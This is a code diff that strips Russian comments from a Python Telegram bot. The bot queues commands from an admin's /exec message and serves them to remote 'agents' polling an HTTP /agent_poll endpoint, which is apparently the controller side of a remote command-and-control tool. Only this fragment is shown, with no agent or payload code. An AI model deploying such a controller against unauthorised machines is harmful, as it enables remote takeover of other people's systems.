@@ -14,7 +14,6 @@ dp = Dispatcher()
 
 pending_commands = {}
 
-# ---------- Обработчики команд ----------
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
     if message.from_user.id != ADMIN_ID:
@@ -26,7 +25,6 @@ async def start_cmd(message: types.Message):
 async def list_agents(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
-    # Здесь нужно хранить список активных агентов, пока заглушка
     await message.answer("Активные агенты: пока не реализовано")
 
 @dp.message(Command("exec"))
@@ -41,7 +39,6 @@ async def exec_cmd(message: types.Message):
     pending_commands[agent_id] = cmd
     await message.answer(f"Команда поставлена в очередь для {agent_id}")
 
-# ---------- HTTP-обработчик для агентов ----------
 async def handle_agent_poll(request):
     data = await request.json()
     agent_id = data.get('agent_id')
@@ -56,7 +53,6 @@ async def handle_agent_poll(request):
     cmd = pending_commands.pop(agent_id, None)
     return web.json_response({'command': cmd})
 
-# ---------- HTTP-сервер ----------
 async def run_http_server():
     app = web.Application()
     app.router.add_post('/agent_poll', handle_agent_poll)
@@ -67,7 +63,6 @@ async def run_http_server():
     await site.start()
     logging.info(f"HTTP сервер запущен на порту {port}")
 
-# ---------- Запуск ----------
 async def main():
     asyncio.create_task(run_http_server())
     await dp.start_polling(bot)
